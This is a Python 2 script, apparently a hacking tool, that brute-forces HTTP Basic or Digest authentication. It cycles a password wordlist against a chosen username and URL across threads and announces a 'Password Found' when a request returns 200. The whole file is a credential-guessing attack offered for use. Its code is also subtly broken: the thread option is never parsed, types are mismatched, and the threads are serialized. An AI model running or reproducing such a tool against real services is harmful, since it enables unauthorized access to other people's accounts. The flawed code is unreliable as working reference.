#!/usr/bin/python

import requests
from threading import Thread
import sys
from termcolor import colored
import time
import getopt
from requests.auth import HTTPDigestAuth

global hit
hit = "1"

def banner():
	ban = 'BASE OR DIGEST BRUTEFORCE AUTH'
	print '*'*len(ban)
	print ban
	print '*'*len(ban)


def usage():
	print "Usage"
	print "-w: url"
	print "-u: username"
	print "-t: threads"
	print "-f: wordlist file"
	print "-m: method (basic or digest)"
	print "Exemple: auth_digest.py -w http://website.com -u admin -t 5 -f passwords.txt -m method"


class request_performer(Thread):
	def __init__(self,passwd,user,url,method):
		Thread.__init__(self)
		self.password = passwd.split("\n")[0]
		self.username = user
		self.url = url
		self.method = method
		print("[-]" + self.password + "[-]")

	def run(self):
		global hit
		if hit == "1":
			try:
				if self.method == "basic":
					r = requests.get(self.url, auth=(self.username, self.password))
				elif self.method == "digest":
					r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
				if r.status_code == 200:
					hit = "0"
					print(colored("[+] Password Found: ",'green') + self.password)
					sys.exit()
				else:
					print(colored("[!!] Not valid password: ",'red') + self.password)
					i[0] = i[0] -1

			except Exception, e:
				print e


def start(argv):
	banner()
	if len(sys.argv) < 5:
		usage()
		sys.exit()
	try:
		opts, args = getopt.getopt(argv, "u:w:f:m:t")
	except getopt.GetoptError:
		print("[!!] Error on arguments!")
		sys.exit()
	method = "basic"
	for opt, arg in opts:
		if opt == '-u':
			user = arg
		elif opt == '-w':
			url = arg
		elif opt == '-f':
			dictionary = arg
		elif opt == '-m':
			method = arg
		elif opt == '-t':
			threads = arg

	try:
		f = open(dictionary,"r")
		passwords = f.readlines()
	except:
		print("[!!] File doesnt Exist, Please check the path")
		sys.exit()

	launcher_threads(passwords,threads,user,url,method)

def launcher_threads(passwords,th,username,url,method):
	global i
	i = []
	i.append(0)

	while len(passwords):
		if hit == "1":
			try:
				if i[0] < th:
					passwd = passwords.pop(0)
					i[0] = i[0] + 1
					thread = request_performer(passwd, username, url, method)
					thread.start()
			except KeyboardInterrupt:
				print("[!!] Interrupted!")
				sys.exit()
			thread.join()


if __name__=="__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print("[!!] Interrupted")
